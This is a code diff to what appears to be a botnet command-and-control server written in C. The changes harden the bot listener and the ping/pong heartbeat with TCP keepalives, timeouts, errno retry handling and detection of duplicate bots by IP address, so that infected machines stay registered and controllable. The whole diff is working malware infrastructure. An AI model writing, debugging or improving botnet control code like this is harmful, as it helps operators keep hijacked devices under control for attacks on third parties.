@@ -5,9 +5,12 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <stdbool.h>
+#include <netinet/tcp.h> //for keepalive etc
+#include <errno.h> //eeeeeee
 
 Bot bots[MAX_BOTS];
-int bot_count = 0;
+int bot_count = 0; //best method for anti dup?
 int global_cooldown = 0;
 pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -29,18 +32,34 @@ void* handle_bot(void* arg) {
         return NULL;
     }
     free(arg);
+
+    struct timeval timeout;
+    timeout.tv_sec = 30;
+    timeout.tv_usec = 0;
+    setsockopt(bot_socket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+    setsockopt(bot_socket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+
     char buffer[MAX_COMMAND_LENGTH] = {0};
     ssize_t len;
     while (1) {
         memset(buffer, 0, sizeof(buffer));
         len = recv(bot_socket, buffer, sizeof(buffer) - 1, 0);
-        if (len <= 0) break;
+        if (len <= 0) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
+                continue;
+            }
+            break;
+        }
         buffer[len] = 0;
         
         if (strncmp(buffer, "ping", 4) == 0) {
             char pong[64];
             snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
-            send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL);
+            if (send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL) < 0) {
+                if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
+                    break;
+                }
+            }
             continue;
         }
         
@@ -67,33 +86,50 @@ void* bot_listener(void* arg) {
     int optval = 1;
     setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
     setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+    
+    int keepalive_time = 30;
+    int keepalive_intvl = 5;  
+    int keepalive_probes = 5; 
+    setsockopt(bot_server_socket, SOL_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
+    setsockopt(bot_server_socket, SOL_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
+    setsockopt(bot_server_socket, SOL_TCP, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));
+    
     struct sockaddr_in bot_server_addr;
     memset(&bot_server_addr, 0, sizeof(bot_server_addr));
     bot_server_addr.sin_family = AF_INET;
     bot_server_addr.sin_addr.s_addr = INADDR_ANY;
     bot_server_addr.sin_port = htons(botport);
+    //add this
     if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
         close(bot_server_socket);
         return NULL;
     }
     listen(bot_server_socket, MAX_BOTS);
+
     while (1) {
         struct sockaddr_in client_addr;
         socklen_t client_len = sizeof(client_addr);
         int *bot_socket = malloc(sizeof(int));
+        bool found_duplicate = false;
         if (!bot_socket) continue;
+        
         *bot_socket = accept(bot_server_socket, (struct sockaddr*)&client_addr, &client_len);
         if (*bot_socket < 0) {
             free(bot_socket);
             continue;
         }
+        // and this
+        setsockopt(*bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
+        setsockopt(*bot_socket, SOL_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
+        setsockopt(*bot_socket, SOL_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
+        setsockopt(*bot_socket, SOL_TCP, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));
 
         char archbuf[64] = {0};
         fd_set readfds;
         struct timeval tv;
         FD_ZERO(&readfds);
         FD_SET(*bot_socket, &readfds);
-        tv.tv_sec = 2;
+        tv.tv_sec = 5;
         tv.tv_usec = 0;
         
         if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
@@ -101,7 +137,35 @@ void* bot_listener(void* arg) {
             if (archlen > 0) {
                 archbuf[archlen] = 0;
                 pthread_mutex_lock(&bot_mutex);
-                if (bot_count < MAX_BOTS) {
+                
+                for (int i = 0; i < bot_count; i++) {
+                    if (bots[i].is_valid && bots[i].address.sin_addr.s_addr == client_addr.sin_addr.s_addr) {
+                        char test = 0;
+                        if (send(bots[i].socket, &test, 0, MSG_NOSIGNAL) < 0) {
+                            close(bots[i].socket);
+                            bots[i].is_valid = 0;
+                        } else {
+                            found_duplicate = true;
+                            close(*bot_socket);
+                            free(bot_socket);
+                            pthread_mutex_unlock(&bot_mutex);
+                            break;
+                        }
+                    }
+                }
+                
+                if (!found_duplicate && bot_count < MAX_BOTS) {
+                    int new_count = 0;
+                    for (int i = 0; i < bot_count; i++) {
+                        if (bots[i].is_valid) {
+                            if (i != new_count) {
+                                bots[new_count] = bots[i];
+                            }
+                            new_count++;
+                        }
+                    }
+                    bot_count = new_count;
+                    
                     bots[bot_count].socket = *bot_socket;
                     bots[bot_count].address = client_addr;
                     bots[bot_count].is_valid = 1;
@@ -113,7 +177,7 @@ void* bot_listener(void* arg) {
                     
                     FD_ZERO(&readfds);
                     FD_SET(*bot_socket, &readfds);
-                    tv.tv_sec = 2;
+                    tv.tv_sec = 5;
                     tv.tv_usec = 0;
                     
                     if (select(*bot_socket + 1, &readfds, NULL, NULL, &tv) > 0) {
@@ -123,13 +187,15 @@ void* bot_listener(void* arg) {
                             inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));
                             const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
                             char logarch[128];
-                            snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture : %s", endian, bots[bot_count].arch);
+                            char* arch = archbuf + 5;  // Skip "pong " prefix
+                            snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture: %s", endian, arch);
                             log_bot_join(logarch, ipbuf);
                             bot_count++;
-                            pthread_mutex_unlock(&bot_mutex);
+                            
                             pthread_t bot_thread;
                             pthread_create(&bot_thread, NULL, handle_bot, bot_socket);
                             pthread_detach(bot_thread);
+                            pthread_mutex_unlock(&bot_mutex);
                             continue;
                         }
                     }
@@ -137,8 +203,11 @@ void* bot_listener(void* arg) {
                 pthread_mutex_unlock(&bot_mutex);
             }
         }
-        close(*bot_socket);
-        free(bot_socket);
+        
+        if (!found_duplicate) {
+            close(*bot_socket);
+            free(bot_socket);
+        }
     }
     close(bot_server_socket);
     return NULL;
@@ -155,6 +224,13 @@ void* ping_bots(void* arg) {
             
             int res = send(bots[i].socket, "ping", 4, MSG_NOSIGNAL);
             if (res < 0) {
+                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
+                    if (current_pos != i) {
+                        bots[current_pos] = bots[i];
+                    }
+                    current_pos++;
+                    continue;
+                }
                 close(bots[i].socket);
                 bots[i].is_valid = 0;
                 continue;
@@ -164,12 +240,19 @@ void* ping_bots(void* arg) {
             struct timeval tv;
             FD_ZERO(&readfds);
             FD_SET(bots[i].socket, &readfds);
-            tv.tv_sec = 2;
+            tv.tv_sec = 10;
             tv.tv_usec = 0;
             memset(pongbuf, 0, sizeof(pongbuf));
             
             if (select(bots[i].socket + 1, &readfds, NULL, NULL, &tv) > 0) {
                 ssize_t ponglen = recv(bots[i].socket, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
+                if (ponglen < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)) {
+                    if (current_pos != i) {
+                        bots[current_pos] = bots[i];
+                    }
+                    current_pos++;
+                    continue;
+                }
                 if (ponglen > 0 && strncmp(pongbuf, "pong ", 5) == 0) {
                     if (current_pos != i) {
                         bots[current_pos] = bots[i];
@@ -180,14 +263,21 @@ void* ping_bots(void* arg) {
                     bots[i].is_valid = 0;
                 }
             } else {
-                close(bots[i].socket);
-                bots[i].is_valid = 0;
+                if (send(bots[i].socket, "", 0, MSG_NOSIGNAL) >= 0) {
+                    if (current_pos != i) {
+                        bots[current_pos] = bots[i];
+                    }
+                    current_pos++;
+                } else {
+                    close(bots[i].socket);
+                    bots[i].is_valid = 0;
+                }
             }
         }
         
         bot_count = current_pos;
         pthread_mutex_unlock(&bot_mutex);
-        sleep(4);
+        sleep(6); 
     }
     return NULL;
 }
